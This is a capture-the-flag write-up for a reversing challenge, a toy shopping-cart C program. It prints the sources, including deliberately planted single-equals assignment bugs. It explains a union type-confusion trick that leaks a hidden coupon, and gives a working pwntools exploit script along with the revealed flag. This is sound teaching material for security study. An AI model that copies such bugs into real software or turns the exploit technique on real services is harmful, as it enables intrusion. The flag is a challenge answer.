# Computed Shopping Assistant
Category: Reversing, 200 Points

## Description

> Welcome to Computed Shopping Assistant!
> 
> The place where you can manage your shopping cart, and get substantial discounts with our special promotion coupons!
> 
> We have given all CSA candidates a free 10% OFF coupon:
> 
> `NOT_A_FLAG{I_4M_A_N3WB1E}`
> 
> Enjoy!
> 
> Please be aware that the system is not perfect, so don't go around buying loaves of soup...

Three files were attached.

<details>
  <summary>View sources...</summary>

`shopping_cart.h`:

```c
#ifndef SHOPPING_CART_H
#define SHOPPING_CART_H

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>

#define SHOPPING_CART_SIZE 100
#define STRING_BUFFER_SIZE 100


enum item_type {
	TYPE_UNDEFINED = 0,
	TYPE_BREAD     = 'b', // loaves
	TYPE_PASTA     = 'p', // kilograms
	TYPE_SOUP      = 's', // liters
	TYPE_DRINK     = 'd', // liters
	TYPE_VEGETABLE = 'v', // kilograms
	TYPE_FRUIT     = 'f', // items
	TYPE_COUPON    = 'c',
};

struct coupon_item {
	int discount_amount;
	int have_entered;
	int is_valid;
	int length;
	int expiration_day;
	int expiration_month;
	int expiration_year;
	char code[STRING_BUFFER_SIZE];
};

struct grocery_item {
	int amount_grams; // deprecated - use kilograms instead
	int amount_kilograms;
	int amount_items;
	int amount_loaves;
	int amount_liters;
	char description[STRING_BUFFER_SIZE];
};

struct shopping_cart_item {
	enum item_type type;
	union {
		struct coupon_item coupon;
		struct grocery_item grocery_item;
	};
};
typedef struct shopping_cart_item item;


struct shopping_cart {
	int amount_of_items;
	item items[SHOPPING_CART_SIZE];
};


item* add_item(enum item_type type);
void remove_item(int index);
bool can_edit_item(item* item);
bool is_valid_food_type(enum item_type type);
char* food_type_to_unit(enum item_type type);
void load_coupon(char* path, int discount);


#endif /* SHOPPING_CART_H */

```

`shopping_cart.c`:

```c
#include "shopping_cart.h"

struct shopping_cart shopping_cart;
char user_input[STRING_BUFFER_SIZE];
bool loaded_coupons;

int get_free_index() {
	for (int i = 0; i < SHOPPING_CART_SIZE; i++) {
		if (shopping_cart.items[i].type == TYPE_UNDEFINED) {
			return i;
		}
	}
	return -1;
}

item* add_item(enum item_type type) {
	int idx = get_free_index();
	if (idx == -1) {
		printf("Can't add more items to your shopping cart!\n");
		exit(0);
	}
	shopping_cart.items[idx].type = type;
	shopping_cart.amount_of_items++;
	return &shopping_cart.items[idx];
}

void remove_item(int index) {
	if (shopping_cart.items[index].type == TYPE_UNDEFINED) {
		printf("Item %d is not in your shopping cart!\n", index);
		return;
	}
	shopping_cart.items[index].type = TYPE_UNDEFINED;
	shopping_cart.amount_of_items--;
	printf("Item %d removed!\n", index);
}

bool can_edit_item(item* item){
	if ((item->type == TYPE_UNDEFINED)) {
		printf("There is no item at selected index\n");
		return false;
	} else if 
		(((item->type == TYPE_BREAD) && (item->grocery_item.amount_loaves > 0)) || ((item->type == TYPE_PASTA) && (item->grocery_item.amount_kilograms > 0)) ||
		((item->type == TYPE_SOUP) && (item->grocery_item.amount_liters > 0)) || ((item->type == TYPE_DRINK) && (item->grocery_item.amount_liters > 0)) ||
		((item->type == TYPE_VEGETABLE) && (item->grocery_item.amount_kilograms > 0)) || ((item->type = TYPE_FRUIT) && (item->grocery_item.amount_items > 0))) {
		return true;
	} else if ((item->type = TYPE_COUPON)) {
		printf("Item is a coupon!\n");
		return false;
	} else {
		printf("Invalid item type!\n");
		return false;
	}
}

bool is_valid_food_type(enum item_type type) {
	return (
		(type == TYPE_BREAD)     || 
		(type == TYPE_PASTA)     || 
		(type == TYPE_SOUP)      || 
		(type == TYPE_DRINK)     || 
		(type == TYPE_VEGETABLE) || 
		(type == TYPE_FRUIT));
}

char* food_type_to_unit(enum item_type type) {
	switch (type) {
		case TYPE_BREAD:
			return "loaves";
			break;
		case TYPE_PASTA:
		case TYPE_VEGETABLE:
			return "kilogram(s)";
			break;
		case TYPE_SOUP:
		case TYPE_DRINK:
			return "liter(s)";
			break;
		case TYPE_FRUIT:
			return "unit(s)";
			break;
	}
}

bool is_coupon_valid(char* coupon) {
	// black list of expired coupons
	if (!memcmp(coupon, "NOT_A_FLAG{I_L0V3_CSA}", strlen(coupon)) ||
		!memcmp(coupon, "NOT_A_FLAG{G1V3_M3_M0R3_C0UP0N5_PL3453}", strlen(coupon)) ||
		!memcmp(coupon, "NOT_A_FLAG{TH3_C4K3_1S_A_L1E}", strlen(coupon))) {
		return false;
	} else {
		return true;
	}
}

void load_coupon(char* path, int discount) {
	char coupon[STRING_BUFFER_SIZE];

	FILE *fp = fopen(path, "r");
	if (fp == NULL) {
		printf("Unable to open file! (%s)\n", path);
		exit(0);
	}

	if (fgets(coupon, STRING_BUFFER_SIZE, fp) == NULL) {
		printf("Could not load coupon %s!\n", path);
		exit(0);
	}
	fclose(fp);

	int is_valid = is_coupon_valid(coupon);
	if (!is_valid) {
		return;
	}

	item* item = add_item(TYPE_COUPON);
	item->coupon.discount_amount = discount;
	item->coupon.have_entered = false;
	item->coupon.is_valid = is_valid;
	item->coupon.length = strlen(coupon);
	item->coupon.expiration_day = 0;  // todo - implement expiration date check
	item->coupon.expiration_month = 0;
	item->coupon.expiration_year = 0;
	strncpy(item->coupon.code, coupon, strlen(coupon));
}

```

`main.c`:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include "shopping_cart.h"

extern struct shopping_cart shopping_cart;
extern char user_input[];
extern bool loaded_coupons;

void add_item_menu() {
	printf("Which item would you like to add?\n");
	printf("%c - Bread\n", TYPE_BREAD);
	printf("%c - Pasta\n", TYPE_PASTA);
	printf("%c - Soup\n", TYPE_SOUP);
	printf("%c - Drink\n", TYPE_DRINK);
	printf("%c - Vegetable\n", TYPE_VEGETABLE);
	printf("%c - Fruit\n", TYPE_FRUIT);

	char choice_type;
	scanf(" %c", &choice_type);

	if (!is_valid_food_type(choice_type)) {
		printf("Invalid type entered!\n");
		return;
	}

	item* item = add_item(choice_type);

	switch (choice_type) {
		case TYPE_BREAD:
			strcpy(item->grocery_item.description, "White bread");
			item->grocery_item.amount_loaves = 1;
			break;
		case TYPE_PASTA:
			strcpy(item->grocery_item.description, "Spaghetti");
			item->grocery_item.amount_kilograms = 1;
			break;
		case TYPE_SOUP:
			strcpy(item->grocery_item.description, "Lentil soup");
			item->grocery_item.amount_liters = 1;
			break;
		case TYPE_DRINK:
			strcpy(item->grocery_item.description, "Coca-Cola");
			item->grocery_item.amount_liters = 1;
			break;
		case TYPE_VEGETABLE:
			strcpy(item->grocery_item.description, "Potatoes");
			item->grocery_item.amount_kilograms = 1;
			break;
		case TYPE_FRUIT:
			strcpy(item->grocery_item.description, "Apples");
			item->grocery_item.amount_items = 1;
			break;
	}
	printf("1 %s of %s added!\n", food_type_to_unit(choice_type), item->grocery_item.description);
}

void edit_item_menu() {
	if (shopping_cart.amount_of_items == 0) {
		printf("Your shopping cart is empty!\n");
		return;
	}
	printf("Which item index would you like to edit?\n");

	int choice;
	scanf("%d", &choice);
	if (choice < 0 || choice >= SHOPPING_CART_SIZE) {
		printf("Invalid item index!\n");
		return;
	}
	item* item = &shopping_cart.items[choice];

	if (!can_edit_item(item)) {
		printf("Can not edit this item!\n");
		return;
	}

	printf("Which property would you like to edit?\n"
		"1 - Type\n"
		"2 - Amount of kilograms\n"
		"3 - Amount of items\n"
		"4 - Amount of loaves\n"
		"5 - Amount of liters\n"
		"6 - Description\n"
		"7 - Cancel\n");
	scanf("%d", &choice);

	if (choice < 1 || choice > 7) {
		printf("Invalid choice!\n");
		return;
	}

	char newline;
	scanf("%c", &newline); // clear newline from buffer
	char choice_type;

	switch (choice) {
		case 1:
			printf("Enter new type: ");
			fflush(stdout);
			scanf(" %c", &choice_type);
			if (choice_type == TYPE_COUPON) {
				printf("You can not convert to coupon!\n");
			} else if (is_valid_food_type(choice_type)) {
				item->type = choice_type;
			} else {
				printf("Invalid type entered!\n");
			}
			break;
		case 2:
			printf("Enter new kilograms amount: ");
			fflush(stdout);
			scanf("%d", &choice);
			item->grocery_item.amount_kilograms = choice;
			break;
		case 3:
			printf("Enter new items amount: ");
			fflush(stdout);
			scanf("%d", &choice);
			item->grocery_item.amount_items = choice;
			break;
		case 4:
			printf("Enter new loaves amount: ");
			fflush(stdout);
			scanf("%d", &choice);
			item->grocery_item.amount_loaves = choice;
			break;
		case 5:
			printf("Enter new liters amount: ");
			fflush(stdout);
			scanf("%d", &choice);
			item->grocery_item.amount_liters = choice;
			break;
		case 6:
			printf("Enter new description: ");
			fflush(stdout);
			fgets(item->grocery_item.description, STRING_BUFFER_SIZE, stdin);
			item->grocery_item.description[strlen(item->grocery_item.description)-1] = '\0'; // remove newline
			break;
		case 7:
			return;
			break;
	}
	printf("Item updated!\n");
}

void remove_item_menu() {
	if (shopping_cart.amount_of_items == 0) {
		printf("Your shopping cart is empty!\n");
		return;
	}
	printf("Which item index would you like to remove?\n");

	int choice;
	scanf("%d", &choice);
	if (choice < 0 || choice >= SHOPPING_CART_SIZE) {
		printf("Invalid item index!\n");
		return;
	}
	remove_item(choice);
}

void print_shopping_cart() {
	if (shopping_cart.amount_of_items == 0) {
		printf("\nYour shopping cart is empty!\n");
		return;
	}
	printf("\nYour shopping cart has %d items:\n", shopping_cart.amount_of_items);
	for (int i = 0; i < SHOPPING_CART_SIZE; i++) {
		item* item = &shopping_cart.items[i];

		int amount = 0;
		switch (item->type) {
			case TYPE_UNDEFINED:
				break;
			case TYPE_COUPON:
				if (item->coupon.have_entered) {
					printf("(index %d) - %d%% OFF coupon - %s\n", i, item->coupon.discount_amount, item->coupon.code);
				}
				break;
			default:
				switch (item->type) {
					case TYPE_BREAD:
						amount = item->grocery_item.amount_loaves;
						break;
					case TYPE_PASTA:
					case TYPE_VEGETABLE:
						amount = item->grocery_item.amount_kilograms;
						break;
					case TYPE_SOUP:
					case TYPE_DRINK:
						amount = item->grocery_item.amount_liters;
						break;
					case TYPE_FRUIT:
						amount = item->grocery_item.amount_items;
				}
				printf("(index %d) - %d %s of %s\n", i, amount, food_type_to_unit(item->type), item->grocery_item.description);
				break;
		}
	}
}

void apply_a_coupon() {
	if (!loaded_coupons) {
		load_coupon("coupon_10.txt", 10);
		load_coupon("coupon_50.txt", 50);
		loaded_coupons = true;
	}
	printf("Please enter your coupon:\n");
	char newline;
	scanf("%c", &newline); // clear newline from buffer
	fgets(user_input, STRING_BUFFER_SIZE, stdin);
	
	for (int i = 0; i < SHOPPING_CART_SIZE; i++) {
		item* item = &shopping_cart.items[i];
		if (item->type == TYPE_COUPON && !item->coupon.have_entered) {
			if (!memcmp(item->coupon.code, user_input, item->coupon.length)) {
				printf("Applied coupon for %d%% OFF!\n", item->coupon.discount_amount);
				item->coupon.have_entered = true;
				return;
			}
		}
	}
	printf("Invalid coupon!\n");
}

void checkout() {
	printf("\nThank you for choosing Computed Shopping Assistant!\n");
	printf("Your items will be delivered to you within 24 hours.\n");
	printf("Goodbye!\n");
	exit(0);
}

void main_menu() {
	printf("\n---> Welcome to Computed Shopping Assistant <---\n");

	while (true) {
		printf("\nWhat would you like to do?\n"
				"1 - Add item to shopping cart\n"
				"2 - Edit item in shopping cart\n"
				"3 - Remove item from shopping cart\n"
				"4 - View shopping cart\n"
				"5 - Apply a coupon\n"
				"6 - Checkout\n");

		int choice = 0;
		scanf("%d", &choice);

		switch (choice) {
			case 1:
				add_item_menu();
				break;
			case 2:
				edit_item_menu();
				break;
			case 3:
				remove_item_menu();
				break;
			case 4:
				print_shopping_cart();
				break;
			case 5:
				apply_a_coupon();
				break;
			case 6:
				checkout();
				break;
			default:
				printf("Invalid choice!\n");
				exit(0);
				break;
		}
	}
}

int main() {
	memset(&shopping_cart, 0, sizeof(shopping_cart));
	main_menu();
}
```

</details>


## Solution

This program implements a simple shopping cart where we can buy different items. We even have the ability to apply coupons.

```console
┌──(user@kali)-[/media/sf_CTFs/checkpoint/Computed_Shopping_Assistant]
└─$ nc csa.csa-challenge.com 1111

---> Welcome to Computed Shopping Assistant <---

What would you like to do?
1 - Add item to shopping cart
2 - Edit item in shopping cart
3 - Remove item from shopping cart
4 - View shopping cart
5 - Apply a coupon
6 - Checkout
1
Which item would you like to add?
b - Bread
p - Pasta
s - Soup
d - Drink
v - Vegetable
f - Fruit
b
1 loaves of White bread added!

What would you like to do?
1 - Add item to shopping cart
2 - Edit item in shopping cart
3 - Remove item from shopping cart
4 - View shopping cart
5 - Apply a coupon
6 - Checkout
5
Please enter your coupon:
NOT_A_FLAG{I_4M_A_N3WB1E}
Applied coupon for 10% OFF!

What would you like to do?
1 - Add item to shopping cart
2 - Edit item in shopping cart
3 - Remove item from shopping cart
4 - View shopping cart
5 - Apply a coupon
6 - Checkout
6

Thank you for choosing Computed Shopping Assistant!
Your items will be delivered to you within 24 hours.
Goodbye!
```

From the description we got the coupon code for a 10% discount, but according to the sources there's also a coupon for a 50% discount:

```c
void apply_a_coupon() {
	if (!loaded_coupons) {
		load_coupon("coupon_10.txt", 10);
		load_coupon("coupon_50.txt", 50);
		loaded_coupons = true;
	}
    //...
```

How can we leak it?

Once we buy an item, it's saved in a global context which contains an array of items:

```c
struct coupon_item {
	int discount_amount;
	int have_entered;
	int is_valid;
	int length;
	int expiration_day;
	int expiration_month;
	int expiration_year;
	char code[STRING_BUFFER_SIZE];
};

struct grocery_item {
	int amount_grams; // deprecated - use kilograms instead
	int amount_kilograms;
	int amount_items;
	int amount_loaves;
	int amount_liters;
	char description[STRING_BUFFER_SIZE];
};

struct shopping_cart_item {
	enum item_type type;
	union {
		struct coupon_item coupon;
		struct grocery_item grocery_item;
	};
};
typedef struct shopping_cart_item item;

struct shopping_cart {
	int amount_of_items;
	item items[SHOPPING_CART_SIZE];
};

struct shopping_cart shopping_cart;
```

We can see that both grocery items and coupon items are saved in the same array. When we select to "Apply Coupons", the code in `apply_a_coupon` first loads all coupons into the array (if they weren't loaded before), and marks them as `have_entered = false` as long as the user hasn't entered them.

```c

void load_coupon(char* path, int discount) {
	char coupon[STRING_BUFFER_SIZE];

	FILE *fp = fopen(path, "r");
	if (fp == NULL) {
		printf("Unable to open file! (%s)\n", path);
		exit(0);
	}

	if (fgets(coupon, STRING_BUFFER_SIZE, fp) == NULL) {
		printf("Could not load coupon %s!\n", path);
		exit(0);
	}
	fclose(fp);

	int is_valid = is_coupon_valid(coupon);
	if (!is_valid) {
		return;
	}

	item* item = add_item(TYPE_COUPON);
	item->coupon.discount_amount = discount;
	item->coupon.have_entered = false;
	item->coupon.is_valid = is_valid;
	item->coupon.length = strlen(coupon);
	item->coupon.expiration_day = 0;  // todo - implement expiration date check
	item->coupon.expiration_month = 0;
	item->coupon.expiration_year = 0;
	strncpy(item->coupon.code, coupon, strlen(coupon));
}

void apply_a_coupon() {
	if (!loaded_coupons) {
		load_coupon("coupon_10.txt", 10);
		load_coupon("coupon_50.txt", 50);
		loaded_coupons = true;
	}
    //...
}
```

We just want to print the other coupon. However, this is blocked by the code in `print_shopping_cart`:

```c
			case TYPE_COUPON:
				if (item->coupon.have_entered) {
					printf("(index %d) - %d%% OFF coupon - %s\n", i, item->coupon.discount_amount, item->coupon.code);
				}
				break;
```

We only get the contents of the coupon if we've already entered it:

```console
┌──(user@kali)-[/media/sf_CTFs/checkpoint/Computed_Shopping_Assistant]
└─$ nc csa.csa-challenge.com 1111

---> Welcome to Computed Shopping Assistant <---

What would you like to do?
1 - Add item to shopping cart
2 - Edit item in shopping cart
3 - Remove item from shopping cart
4 - View shopping cart
5 - Apply a coupon
6 - Checkout
5
Please enter your coupon:
NOT_A_FLAG{I_4M_A_N3WB1E}
Applied coupon for 10% OFF!

What would you like to do?
1 - Add item to shopping cart
2 - Edit item in shopping cart
3 - Remove item from shopping cart
4 - View shopping cart
5 - Apply a coupon
6 - Checkout
4

Your shopping cart has 2 items:
(index 0) - 10% OFF coupon - NOT_A_FLAG{I_4M_A_N3WB1E}

What would you like to do?
1 - Add item to shopping cart
2 - Edit item in shopping cart
3 - Remove item from shopping cart
4 - View shopping cart
5 - Apply a coupon
6 - Checkout
```

As we can see, the shopping cart has two items (both 10% and 50% coupons but only the former is displayed).

Notice how the array contains `shopping_cart_item` entries, which are essentially a union of `grocery_item` and `coupon_item`. So, given some array entry in memory, there are two ways to look at it:

```
        coupon_item                        grocery_item
+---------------------------+   +---------------------------------+
| discount_amount           |   | amount_grams                    |
+---------------------------+   +---------------------------------+
| have_entered              |   | amount_kilograms                |
+---------------------------+   +---------------------------------+
| is_valid                  |   | amount_items                    |
+---------------------------+   +---------------------------------+
| length                    |   | amount_loaves                   |
+---------------------------+   +---------------------------------+
| expiration_day            |   | amount_liters                   |
+---------------------------+   +---------------------------------+
| expiration_month          |   | description[STRING_BUFFER_SIZE] |
+---------------------------+   |                                 |
| expiration_year           |   |                                 |
+---------------------------+   |                                 |
| code[STRING_BUFFER_SIZE]  |   +---------------------------------+
|                           |
|                           |
+---------------------------+   
```

So if we can treat the `coupon_item` as a `grocery_item` and change the `amount_kilograms` to `1`, when we look at the entry as a `coupon_item` it will state that `have_entered == 1` and we'll be able to print the coupon. We even have a function that allows us to change `amount_kilograms`: `edit_item_menu()`. We can enter any amount we want, as long as we can pass `can_edit_item` successfully:

```c
bool can_edit_item(item* item){
	if ((item->type == TYPE_UNDEFINED)) {
		printf("There is no item at selected index\n");
		return false;
	} else if 
		(((item->type == TYPE_BREAD) && (item->grocery_item.amount_loaves > 0)) || ((item->type == TYPE_PASTA) && (item->grocery_item.amount_kilograms > 0)) ||
		((item->type == TYPE_SOUP) && (item->grocery_item.amount_liters > 0)) || ((item->type == TYPE_DRINK) && (item->grocery_item.amount_liters > 0)) ||
		((item->type == TYPE_VEGETABLE) && (item->grocery_item.amount_kilograms > 0)) || ((item->type = TYPE_FRUIT) && (item->grocery_item.amount_items > 0))) {
		return true;
	} else if ((item->type = TYPE_COUPON)) {
		printf("Item is a coupon!\n");
		return false;
	} else {
		printf("Invalid item type!\n");
		return false;
	}
}
```

At first glace, though, it seems like we can't. Grocery items are editable, but coupons are certainly not. On the other hand, we can't take a grocery item and convert it to a coupon either, since that's explicitly blocked:

```c
if (choice_type == TYPE_COUPON) {
    printf("You can not convert to coupon!\n");
} 
```

So, how do we proceed? Well, a closer examination of `can_edit_item` reveals a few bugs. Did you spot them? Here they are: `(item->type = TYPE_FRUIT)` and `(item->type = TYPE_COUPON)`. In these cases, only a single equal sign is used, instead of a double equal sign. This means that the `item->type` is actually assigned instead of being compared. This is great news, since this will allow us to move between a coupon and a grocery item. We want the item to be a grocery item? We need to invoke the function while `item->grocery_item.amount_items > 0` and the item will become a fruit (returning at the first `return true`). We want it to be a coupon? We invoke the function while `item->grocery_item.amount_items == 0`, and after it becomes a fruit it continues to the next condition and then becomes a coupon (returning at the second `return false`).

So our plan is:

 1. Load the coupons
 2. Edit the second coupon (turning it into a fruit) and set the amount of kilograms to 1
 3. Edit the second coupon (now a fruit) and set the amount of items to 0
 4. (Try to) edit the second coupon (still a fruit), turning it back into a coupon
 5. Print the coupons


The following script will invoke the needed sequence:

```python
# First, generate a pwntools template with the following command:
#  pwn template --host csa.csa-challenge.com --port 1111
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

from enum import Enum
from typing import Union

class ComputedShoppingAssistant():

    class MenuOption(Enum):
        ADD_ITEM        = 1
        EDIT_ITEM       = 2
        REMOVE_ITEM     = 3
        VIEW_CART       = 4
        APPLY_COUPON    = 5
        CHECKOUT        = 6

    class ItemProperty(Enum):
        TYPE            = 1
        KILOGRAMS       = 2
        ITEMS           = 3
        LOAVES          = 4
        LITERS          = 5
        DESCRIPTION     = 6
        INVALID         = 7

    def __init__(self, io: pwnlib.tubes.tube):
        self.io = io

    def _select_menu(self, selection: "ComputedShoppingAssistant.MenuOption") -> None:
        self.io.recvuntilS(b"What would you like to do?\r\n")
        for _ in self.MenuOption:
            self.io.recvline()
        self.io.sendline(str(selection.value).encode("ascii"))

    def apply_coupon(self, coupon: str) -> bool:
        self._select_menu(self.MenuOption.APPLY_COUPON)
        self.io.sendlineafter(b"Please enter your coupon:\r\n", coupon.encode("ascii"))
        result = self.io.recvlineS()
        return result != "Invalid coupon!\r\n"

    def edit_item(self, index: int, property: "ComputedShoppingAssistant.ItemProperty", value: Union[int, str, None]) -> bool:
        self._select_menu(self.MenuOption.EDIT_ITEM)
        self.io.sendlineafter(b"Which item index would you like to edit?\r\n", str(index).encode("ascii"))
        out = self.io.recvlineS()
        if out == "Item is a coupon!\r\n":
            return False
        assert(out == "Which property would you like to edit?\r\n")
        for _ in self.ItemProperty:
            self.io.recvline()
        self.io.sendline(str(property.value).encode("ascii"))
        self.io.sendlineafter(b": ", str(value).encode("ascii"))
        out = self.io.recvlineS()
        return out == "Item updated!\r\n"

    def view_cart(self) -> str:
        self._select_menu(self.MenuOption.VIEW_CART)
        self.io.recvuntil(b'\r\nYour shopping cart has')
        self.io.recvline()
        out = self.io.recvuntilS("\r\n\r\n".encode("ascii"))
        return out.strip().split("\r\n")

    def checkout(self) -> None:
        self._select_menu(self.MenuOption.CHECKOUT)


    
io = start()

csa = ComputedShoppingAssistant(io)

csa.apply_coupon("NOT_A_FLAG{I_4M_A_N3WB1E}")

# Will change coupon to fruit and set amount_kilograms (i.e. have_entered) to 1
csa.edit_item(1, ComputedShoppingAssistant.ItemProperty.KILOGRAMS, 1)

# Will set amount_items to 0
csa.edit_item(1, ComputedShoppingAssistant.ItemProperty.ITEMS, 0)

# Will change fruit to coupon
csa.edit_item(1, ComputedShoppingAssistant.ItemProperty.ITEMS, None)

print(csa.view_cart())
csa.checkout()

```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/checkpoint/Computed_Shopping_Assistant]
└─$ python3 exploit.py
[+] Opening connection to csa.csa-challenge.com on port 1111: Done
['(index 0) - 10% OFF coupon - NOT_A_FLAG{I_4M_A_N3WB1E}', '(index 1) - 50% OFF coupon - CSA{iN_L1nuX_1T_W0UlDnT_H4PP3N}']
[*] Closed connection to csa.csa-challenge.com port 1111
```